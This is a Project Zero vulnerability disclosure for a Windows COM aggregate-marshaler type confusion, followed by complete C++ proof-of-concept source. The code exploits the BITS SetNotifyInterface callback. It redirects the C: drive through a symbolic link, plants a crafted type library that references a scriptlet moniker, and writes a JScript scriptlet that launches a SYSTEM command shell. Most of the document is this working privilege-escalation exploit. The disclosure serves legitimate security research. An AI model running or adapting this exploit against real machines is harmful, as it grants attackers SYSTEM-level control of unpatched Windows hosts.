/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1107

Windows: COM Aggregate Marshaler/IRemUnknown2 Type Confusion EoP
Platform: Windows 10 10586/14393 not tested 8.1 Update 2
Class: Elevation of Privilege

Summary:
When accessing an OOP COM object using IRemUnknown2 the local unmarshaled proxy can be for a different interface to that requested by QueryInterface resulting in a type confusion which can result in EoP.

Description:

Querying for an IID on a OOP (or remote) COM object calls the ORPC method RemQueryInterface or RemQueryInterface2 on the default proxy. This request is passed to the remote object which queries the implementation object and if successful returns a marshaled representation of that interface to the caller. 

The difference between RemQueryInterface and RemQueryInterface2 (RQI2) is how the objects are passed back to the caller. For RemQueryInterface the interface is passed back as a STDOBJREF which only contains the basic OXID/OID/IPID information to connect back. RemQueryInterface2 on the other hand passes back MInterfacePointer structures which is an entire OBJREF. The rationale, as far as I can tell, is that RQI2 is used for implementing in-process handlers, some interfaces can be marshaled using the standard marshaler and others can be custom marshaled. This is exposed through the Aggregate Standard Marshaler. 

The bug lies in the implementation of unpacking the results of the the RQI2 request in CStdMarshal::Finish_RemQIAndUnmarshal2. For each MInterfacePointer CStdMarshal::UnmarshalInterface is called passing the IID of the expected interface and the binary data wrapped in an IStream. CStdMarshal::UnmarshalInterface blindly unmarshals the interface, which creates a local proxy object but the proxy is created for the IID in the OBJREF stream and NOT the IID requested in RQI2. No further verification occurs at this point and the created proxy is passed back up the call stack until the received by the caller (through a void** obviously). 

If the IID in the OBJREF doesn’t match the IID requested the caller doesn’t know, if it calls any methods on the expected interface it will be calling a type confused object. This could result in crashes in the caller when it tries to access methods on the expected interface which aren’t there or are implemented differently. You could probably also return a standard OBJREF to a object local to the caller, this will result in returning the local object itself which might have more scope for exploiting the type confusion. In order to get the caller to use RQI2 we just need to pass it back an object which is custom marshaled with the Aggregate Standard Marshaler. This will set a flag on the marshaler which indicates to always use the aggregate marshaler which results in using RQI2 instead of RQI. As this class is a core component of COM it’s trusted and so isn’t affected by the EOAC_NO_CUSTOM_MARSHAL setting.

In order to exploit this a different caller needs to call QueryInterface on an object under a less trusted user's control. This could be a more privileged user (such as a sandbox broker), or a privileged service. This is pretty easy pattern to find, any method in an exposed interface on a more trusted COM object which takes an interface pointer or variant would potentially be vulnerable. For example IPersistStream takes an IStream interface pointer and will call methods on it. Another type of method is one of the various notification interfaces such as IBackgroundCopyCallback for BITS. This can probably also be used remotely if the attacker has the opportunity to inject an OBJREF stream into a connection which is set to CONNECT level security (which seems to be the default activation security). 

On to exploitation, as you well know I’ve little interest in exploiting memory corruptions, especially as this would  either this will trigger CFG on modern systems or would require a very precise lineup of expected method and actual called method which could be tricky to exploit reliably. However I think at least using this to escape a sandbox it might be your only option. So I’m not going to do that, instead I’m going to exploit it logically, the only problem is this is probably unexploitable from a sandbox (maybe) and requires a very specific type of callback into our object. 

The thing I’m going to exploit is in the handling of OLE Automation auto-proxy creation from type libraries. When you implement an Automation compatible object you could implement an explicit proxy but if you’ve already got a Type library built from your IDL then OLEAUT32 provides an alternative. If you register your interface with a Proxy CLSID for PSOAInterface or PSDispatch then instead of loading your PS DLL it will load OLEAUT32. The proxy loader code will lookup the interface entry for the passed IID to see if there’s a registered type library associated with it. If there is the code will call LoadTypeLib on that library and look up the interface entry in the type library. It will then construct a custom proxy object based on the type library information. 

The trick here is while in general we don’t control the location of the type library (so it’s probably in a location we can write to such as system32) if we can get an object unmarshaled which indicates it’s IID is one of these auto-proxy interfaces while the privileged service is impersonating us we can redirect the C: drive to anywhere we like and so get the service to load an arbitrary type library file instead of a the system one. One easy place where this exact scenario occurs is in the aforementioned BITS SetNotifyInterface function. The service first impersonates the caller before calling QI on the notify interface. We can then return an OBJREF for a automation IID even though the service asked for a BITS callback interface.

So what? Well it’s been known for almost 10 years that the Type library file format is completely unsafe. It was reported and it wasn’t changed, Tombkeeper highlighted this in his “Sexrets [sic] of LoadLibrary” presentation at CSW 2015. You can craft a TLB which will directly control EIP. Now you’d assume therefore I’m trading a unreliable way of getting EIP control for one which is much easier, if you assume that you’d be wrong. Instead I’m going to abuse the fact that TLBs can have referenced type libraries, which is used instead of embedding the type definitions inside the TLB itself. When a reference type is loaded the loader will try and look up the TLB by its GUID, if that fails it will take the filename string and pass it verbatim to LoadTypeLib. It’s a lesser know fact that this function, if it fails to find a file with the correct name will try and parse the name as a moniker. Therefore we can insert a scriptlet moniker into the type library, when the auto-proxy generator tries to find how many functions the interface implements it walks the inheritance chain, which causes the referenced TLB to be loaded, which causes a scriptlet moniker to be loaded and bound which results in arbitrary execution in a scripting language inside the privileged COM caller. 

The need to replace the C: drive is why this won’t work as a sandbox escape. Also it's a more general technique, not specific to this vulnerability as such, you could exploit it in the low-level NDR marshaler layer, however it’s rare to find something impersonating the caller during the low-level unmarshal. Type libraries are not loaded using the flag added after CVE-2015-1644 which prevent DLLs being loaded from the impersonate device map. I think you might want to fix this as well as there’s other places and scenarios this can occur, for example there’s a number of WMI services (such as anything which touches GPOs) which result in the ActiveDS com object being created, this is automation compatible and so will load a type library while impersonating the caller. Perhaps the auto-proxy generated should temporarily disable impersonation when loading the type library to prevent this happening. 

Proof of Concept:

I’ve provided a PoC as a C++ source code file. You need to compile it first. It abuses the BITS SetNotifyInterface to get a type library loaded under impersonation. We cause it to load a type library which references a scriptlet moniker which gets us code execution inside the BITS service.

1) Compile the C++ source code file.
2) Execute the PoC from a directory writable by the current user. 
3) An admin command running as local system should appear on the current desktop.

Expected Result:
The caller should realize there’s an IID mismatch and refuse to unmarshal, or at least QI the local proxy for the correct interface.

Observed Result:
The wrong proxy is created to that requested resulting in type confusion and an automation proxy being created resulting in code execution in the BITS server.
*/

// BITSTest.cpp : Defines the entry point for the console application.
//
#include <bits.h>
#include <bits4_0.h>
#include <stdio.h>
#include <tchar.h>
#include <lm.h>
#include <string>
#include <comdef.h>
#include <winternl.h>
#include <Shlwapi.h>
#include <strsafe.h>
#include <vector>

#pragma comment(lib, "shlwapi.lib")

static bstr_t IIDToBSTR(REFIID riid)
{
	LPOLESTR str;
	bstr_t ret = "Unknown";
	if (SUCCEEDED(StringFromIID(riid, &str)))
	{
		ret = str;
		CoTaskMemFree(str);
	}
	return ret;
}

GUID CLSID_AggStdMarshal2 = { 0x00000027,0x0000,0x0008,{ 0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46 } };
GUID IID_ITMediaControl = { 0xc445dde8,0x5199,0x4bc7,{ 0x98,0x07,0x5f,0xfb,0x92,0xe4,0x2e,0x09 } };

class CMarshaller : public IMarshal
{
	LONG _ref_count;
	IUnknownPtr _unk;

	~CMarshaller() {}

public:

	CMarshaller(IUnknown* unk) : _ref_count(1)
	{
		_unk = unk;
	}

	virtual HRESULT STDMETHODCALLTYPE QueryInterface(
		/* [in] */ REFIID riid,
		/* [iid_is][out] */ _COM_Outptr_ void __RPC_FAR *__RPC_FAR *ppvObject)
	{
		*ppvObject = nullptr;
		printf("QI - Marshaller: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);

		if (riid == IID_IUnknown)
		{
			*ppvObject = this;
		}
		else if (riid == IID_IMarshal)
		{
			*ppvObject = static_cast<IMarshal*>(this);
		}
		else
		{
			return E_NOINTERFACE;
		}
		printf("Queried Success: %p\n", *ppvObject);
		((IUnknown*)*ppvObject)->AddRef();
		return S_OK;
	}

	virtual ULONG STDMETHODCALLTYPE AddRef(void)
	{
		printf("AddRef: %d\n", _ref_count);
		return InterlockedIncrement(&_ref_count);
	}

	virtual ULONG STDMETHODCALLTYPE Release(void)
	{
		printf("Release: %d\n", _ref_count);
		ULONG ret = InterlockedDecrement(&_ref_count);
		if (ret == 0)
		{
			printf("Release object %p\n", this);
			delete this;
		}
		return ret;
	}

	virtual HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  CLSID *pCid)
	{
		*pCid = CLSID_AggStdMarshal2;
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE GetMarshalSizeMax(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  DWORD *pSize)
	{
		*pSize = 1024;
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags)
	{
		printf("Marshal Interface: %ls\n", IIDToBSTR(riid).GetBSTR());
		IID iid = riid;
		if (iid == __uuidof(IBackgroundCopyCallback2) || iid == __uuidof(IBackgroundCopyCallback))
		{
			printf("Setting bad IID\n");
			iid = IID_ITMediaControl;
		}
		HRESULT hr = CoMarshalInterface(pStm, iid, _unk, dwDestContext, pvDestContext, mshlflags);
		printf("Marshal Complete: %08X\n", hr);
		return hr;
	}

	virtual HRESULT STDMETHODCALLTYPE UnmarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][out] */
		_Outptr_  void **ppv)
	{
		return E_NOTIMPL;
	}

	virtual HRESULT STDMETHODCALLTYPE ReleaseMarshalData(
		/* [annotation][unique][in] */
		_In_  IStream *pStm)
	{
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE DisconnectObject(
		/* [annotation][in] */
		_In_  DWORD dwReserved)
	{
		return S_OK;
	}
};

class FakeObject : public IBackgroundCopyCallback2, public IPersist
{
	LONG m_lRefCount;

	~FakeObject() {};

public:
	//Constructor, Destructor
	FakeObject() {
		m_lRefCount = 1;
	}

	//IUnknown
	HRESULT __stdcall QueryInterface(REFIID riid, LPVOID *ppvObj)
	{
		if (riid == __uuidof(IUnknown))
		{
			printf("Query for IUnknown\n");
			*ppvObj = this;
		}
		else if (riid == __uuidof(IBackgroundCopyCallback2))
		{
			printf("Query for IBackgroundCopyCallback2\n");
			*ppvObj = static_cast<IBackgroundCopyCallback2*>(this);
		}
		else if (riid == __uuidof(IBackgroundCopyCallback))
		{
			printf("Query for IBackgroundCopyCallback\n");
			*ppvObj = static_cast<IBackgroundCopyCallback*>(this);
		}
		else if (riid == __uuidof(IPersist))
		{
			printf("Query for IPersist\n");
			*ppvObj = static_cast<IPersist*>(this);
		}
		else if (riid == IID_ITMediaControl)
		{
			printf("Query for ITMediaControl\n");
			*ppvObj = static_cast<IPersist*>(this);
		}
		else
		{
			printf("Unknown IID: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);
			*ppvObj = NULL;
			return E_NOINTERFACE;
		}

		((IUnknown*)*ppvObj)->AddRef();
		return NOERROR;
	}

	ULONG __stdcall AddRef()
	{
		return InterlockedIncrement(&m_lRefCount);
	}

	ULONG __stdcall Release()
	{
		ULONG  ulCount = InterlockedDecrement(&m_lRefCount);

		if (0 == ulCount)
		{
			delete this;
		}

		return ulCount;
	}

	virtual HRESULT STDMETHODCALLTYPE JobTransferred(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob)
	{
		printf("JobTransferred\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE JobError(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ __RPC__in_opt IBackgroundCopyError *pError)
	{
		printf("JobError\n");
		return S_OK;
	}


	virtual HRESULT STDMETHODCALLTYPE JobModification(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ DWORD dwReserved)
	{
		printf("JobModification\n");
		return S_OK;
	}


	virtual HRESULT STDMETHODCALLTYPE FileTransferred(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ __RPC__in_opt IBackgroundCopyFile *pFile)
	{
		printf("FileTransferred\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE GetClassID(
		/* [out] */ __RPC__out CLSID *pClassID)
	{
		*pClassID = GUID_NULL;
		return S_OK;
	}
};

_COM_SMARTPTR_TYPEDEF(IBackgroundCopyJob, __uuidof(IBackgroundCopyJob));
_COM_SMARTPTR_TYPEDEF(IBackgroundCopyManager, __uuidof(IBackgroundCopyManager));

static HRESULT Check(HRESULT hr)
{
	if (FAILED(hr))
	{
		throw _com_error(hr);
	}
	return hr;
}

#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)

typedef NTSTATUS(NTAPI* fNtCreateSymbolicLinkObject)(PHANDLE LinkHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PUNICODE_STRING TargetName);
typedef VOID(NTAPI *fRtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);

FARPROC GetProcAddressNT(LPCSTR lpName)
{
	return GetProcAddress(GetModuleHandleW(L"ntdll"), lpName);
}


class ScopedHandle
{
	HANDLE _h;
public:
	ScopedHandle() : _h(nullptr)
	{
	}

	ScopedHandle(ScopedHandle&) = delete;

	ScopedHandle(ScopedHandle&& h) {
		_h = h._h;
		h._h = nullptr;
	}

	~ScopedHandle()
	{
		if (!invalid())
		{
			CloseHandle(_h);
			_h = nullptr;
		}
	}

	bool invalid() {
		return (_h == nullptr) || (_h == INVALID_HANDLE_VALUE);
	}

	void set(HANDLE h)
	{
		_h = h;
	}

	HANDLE get()
	{
		return _h;
	}

	HANDLE* ptr()
	{
		return &_h;
	}


};

ScopedHandle CreateSymlink(LPCWSTR linkname, LPCWSTR targetname)
{
	fRtlInitUnicodeString pfRtlInitUnicodeString = (fRtlInitUnicodeString)GetProcAddressNT("RtlInitUnicodeString");
	fNtCreateSymbolicLinkObject pfNtCreateSymbolicLinkObject = (fNtCreateSymbolicLinkObject)GetProcAddressNT("NtCreateSymbolicLinkObject");

	OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING name;
	UNICODE_STRING target;

	pfRtlInitUnicodeString(&name, linkname);
	pfRtlInitUnicodeString(&target, targetname);

	InitializeObjectAttributes(&objAttr, &name, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

	ScopedHandle hLink;

	NTSTATUS status = pfNtCreateSymbolicLinkObject(hLink.ptr(), SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &target);
	if (status == 0)
	{
		printf("Opened Link %ls -> %ls: %p\n", linkname, targetname, hLink.get());
		return hLink;
	}
	else
	{
		printf("Error creating link %ls: %08X\n", linkname, status);
		return ScopedHandle();
	}
}


bstr_t GetSystemDrive()
{
	WCHAR windows_dir[MAX_PATH] = { 0 };

	GetWindowsDirectory(windows_dir, MAX_PATH);

	windows_dir[2] = 0;

	return windows_dir;
}

bstr_t GetDeviceFromPath(LPCWSTR lpPath)
{
	WCHAR drive[3] = { 0 };
	drive[0] = lpPath[0];
	drive[1] = lpPath[1];
	drive[2] = 0;

	WCHAR device_name[MAX_PATH] = { 0 };

	if (QueryDosDevice(drive, device_name, MAX_PATH))
	{
		return device_name;
	}
	else
	{
		printf("Error getting device for %ls\n", lpPath);
		exit(1);
	}
}

bstr_t GetSystemDevice()
{
	return GetDeviceFromPath(GetSystemDrive());
}

bstr_t GetExe()
{
	WCHAR curr_path[MAX_PATH] = { 0 };
	GetModuleFileName(nullptr, curr_path, MAX_PATH);
	return curr_path;
}

bstr_t GetExeDir()
{
	WCHAR curr_path[MAX_PATH] = { 0 };
	GetModuleFileName(nullptr, curr_path, MAX_PATH);
	PathRemoveFileSpec(curr_path);

	return curr_path;
}

bstr_t GetCurrentPath()
{
	bstr_t curr_path = GetExeDir();

	bstr_t ret = GetDeviceFromPath(curr_path);

	ret += &curr_path.GetBSTR()[2];

	return ret;
}

void TestBits()
{
	IBackgroundCopyManagerPtr pQueueMgr;

	Check(CoCreateInstance(__uuidof(BackgroundCopyManager), NULL,
		CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&pQueueMgr)));

	IUnknownPtr pOuter = new CMarshaller(static_cast<IPersist*>(new FakeObject()));
	IUnknownPtr pInner;

	Check(CoGetStdMarshalEx(pOuter, SMEXF_SERVER, &pInner));

	IBackgroundCopyJobPtr pJob;
	GUID guidJob;
	Check(pQueueMgr->CreateJob(L"BitsAuthSample",
		BG_JOB_TYPE_DOWNLOAD,
		&guidJob,
		&pJob));
	
	IUnknownPtr pNotify;
	pNotify.Attach(new CMarshaller(pInner));
	{
		ScopedHandle link = CreateSymlink(L"\\??\\C:", GetCurrentPath());
		printf("Result: %08X\n", pJob->SetNotifyInterface(pNotify));
	}
	if (pJob)
	{
		pJob->Cancel();
	}
	printf("Done\n");
}

class CoInit
{
public:
	CoInit()
	{
		Check(CoInitialize(nullptr));
		Check(CoInitializeSecurity(nullptr, -1, nullptr, nullptr,
			RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NO_CUSTOM_MARSHAL | EOAC_DYNAMIC_CLOAKING, nullptr));
	}

	~CoInit()
	{
		CoUninitialize();
	}
};

// {D487789C-32A3-4E22-B46A-C4C4C1C2D3E0}
static const GUID IID_BaseInterface =
{ 0xd487789c, 0x32a3, 0x4e22,{ 0xb4, 0x6a, 0xc4, 0xc4, 0xc1, 0xc2, 0xd3, 0xe0 } };

// {6C6C9F33-AE88-4EC2-BE2D-449A0FFF8C02}
static const GUID TypeLib_BaseInterface =
{ 0x6c6c9f33, 0xae88, 0x4ec2,{ 0xbe, 0x2d, 0x44, 0x9a, 0xf, 0xff, 0x8c, 0x2 } };

GUID TypeLib_Tapi3 = { 0x21d6d480,0xa88b,0x11d0,{ 0x83,0xdd,0x00,0xaa,0x00,0x3c,0xca,0xbd } };

void Create(bstr_t filename, bstr_t if_name, REFGUID typelib_guid, REFGUID iid, ITypeLib* ref_typelib, REFGUID ref_iid)
{
	DeleteFile(filename);
	ICreateTypeLib2Ptr tlb;
	Check(CreateTypeLib2(SYS_WIN32, filename, &tlb));
	tlb->SetGuid(typelib_guid);

	ITypeInfoPtr ref_type_info;
	Check(ref_typelib->GetTypeInfoOfGuid(ref_iid, &ref_type_info));

	ICreateTypeInfoPtr create_info;
	Check(tlb->CreateTypeInfo(if_name, TKIND_INTERFACE, &create_info));
	Check(create_info->SetTypeFlags(TYPEFLAG_FDUAL | TYPEFLAG_FOLEAUTOMATION));
	HREFTYPE ref_type;
	Check(create_info->AddRefTypeInfo(ref_type_info, &ref_type));
	Check(create_info->AddImplType(0, ref_type));
	Check(create_info->SetGuid(iid));
	Check(tlb->SaveAllChanges());
}

std::vector<BYTE> ReadFile(bstr_t path)
{
	ScopedHandle hFile;
	hFile.set(CreateFile(path, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr));
	if (hFile.invalid())
	{
		throw _com_error(E_FAIL);
	}	
	DWORD size = GetFileSize(hFile.get(), nullptr);
	std::vector<BYTE> ret(size);
	if (size > 0)
	{
		DWORD bytes_read;
		if (!ReadFile(hFile.get(), ret.data(), size, &bytes_read, nullptr) || bytes_read != size)
		{
			throw _com_error(E_FAIL);
		}
	}
	
	return ret;
}

void WriteFile(bstr_t path, const std::vector<BYTE> data)
{
	ScopedHandle hFile;
	hFile.set(CreateFile(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr));
	if (hFile.invalid())
	{
		throw _com_error(E_FAIL);
	}
	
	if (data.size() > 0)
	{
		DWORD bytes_written;
		if (!WriteFile(hFile.get(), data.data(), data.size(), &bytes_written, nullptr) || bytes_written != data.size())
		{
			throw _com_error(E_FAIL);
		}
	}
}

void WriteFile(bstr_t path, const char* data)
{
	const BYTE* bytes = reinterpret_cast<const BYTE*>(data);
	std::vector<BYTE> data_buf(bytes, bytes + strlen(data));
	WriteFile(path, data_buf);
}

void BuildTypeLibs(LPCSTR script_path)
{
	ITypeLibPtr stdole2;
	Check(LoadTypeLib(L"stdole2.tlb", &stdole2));

	printf("Building Library with path: %s\n", script_path);
	unsigned int len = strlen(script_path);

	bstr_t buf = GetExeDir() + L"\\";
	for (unsigned int i = 0; i < len; ++i)
	{
		buf += L"A";
	}

	Create(buf, "IBadger", TypeLib_BaseInterface, IID_BaseInterface, stdole2, IID_IDispatch);
	ITypeLibPtr abc;
	Check(LoadTypeLib(buf, &abc));


	bstr_t built_tlb = GetExeDir() + L"\\output.tlb";
	Create(built_tlb, "ITMediaControl", TypeLib_Tapi3, IID_ITMediaControl, abc, IID_BaseInterface);

	std::vector<BYTE> tlb_data = ReadFile(built_tlb);
	for (size_t i = 0; i < tlb_data.size() - len; ++i)
	{
		bool found = true;
		for (unsigned int j = 0; j < len; j++)
		{
			if (tlb_data[i + j] != 'A')
			{
				found = false;
			}
		}

		if (found)
		{
			printf("Found TLB name at offset %zu\n", i);
			memcpy(&tlb_data[i], script_path, len);
			break;
		}
	}

	CreateDirectory(GetExeDir() + L"\\Windows", nullptr);
	CreateDirectory(GetExeDir() + L"\\Windows\\System32", nullptr);

	bstr_t target_tlb = GetExeDir() + L"\\Windows\\system32\\tapi3.dll";
	WriteFile(target_tlb, tlb_data);
}

const wchar_t x[] = L"ABC";

const wchar_t scriptlet_start[] = L"<?xml version='1.0'?>\r\n<package>\r\n<component id='giffile'>\r\n"
"<registration description='Dummy' progid='giffile' version='1.00' remotable='True'>\r\n"\
"</registration>\r\n"\
"<script language='JScript'>\r\n"\
"<![CDATA[\r\n"\
"  new ActiveXObject('Wscript.Shell').exec('";

const wchar_t scriptlet_end[] = L"');\r\n"\
"]]>\r\n"\
"</script>\r\n"\
"</component>\r\n"\
"</package>\r\n";

bstr_t CreateScriptletFile()
{
	bstr_t script_file = GetExeDir() + L"\\run.sct";
	bstr_t script_data = scriptlet_start;
	bstr_t exe_file = GetExe();
	wchar_t* p = exe_file;
	while (*p)
	{
		if (*p == '\\')
		{
			*p = '/';
		}
		p++;
	}

	DWORD session_id;
	ProcessIdToSessionId(GetCurrentProcessId(), &session_id);
	WCHAR session_str[16];
	StringCchPrintf(session_str, _countof(session_str), L"%d", session_id);

	script_data += L"\"" + exe_file + L"\" " + session_str + scriptlet_end;

	WriteFile(script_file, script_data);

	return script_file;
}

void CreateNewProcess(const wchar_t* session)
{
	DWORD session_id = wcstoul(session, nullptr, 0);
	ScopedHandle token;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, token.ptr()))
	{
		throw _com_error(E_FAIL);
	}

	ScopedHandle new_token;

	if (!DuplicateTokenEx(token.get(), TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, new_token.ptr()))
	{
		throw _com_error(E_FAIL);
	}

	SetTokenInformation(new_token.get(), TokenSessionId, &session_id, sizeof(session_id));

	STARTUPINFO start_info = {};
	start_info.cb = sizeof(start_info);
	start_info.lpDesktop = L"WinSta0\\Default";
	PROCESS_INFORMATION proc_info;
	WCHAR cmdline[] = L"cmd.exe";
	if (CreateProcessAsUser(new_token.get(), nullptr, cmdline,
		nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &start_info, &proc_info))
	{
		CloseHandle(proc_info.hProcess);
		CloseHandle(proc_info.hThread);
	}
}

int wmain(int argc, wchar_t** argv)
{
	try
	{
		CoInit ci;
		if (argc > 1)
		{
			CreateNewProcess(argv[1]);
		}
		else
		{
			bstr_t script = L"script:" + CreateScriptletFile();
			BuildTypeLibs(script);
			TestBits();
		}
	}
	catch (const _com_error& err)
	{
		printf("Error: %ls\n", err.ErrorMessage());
	}

    return 0;
}
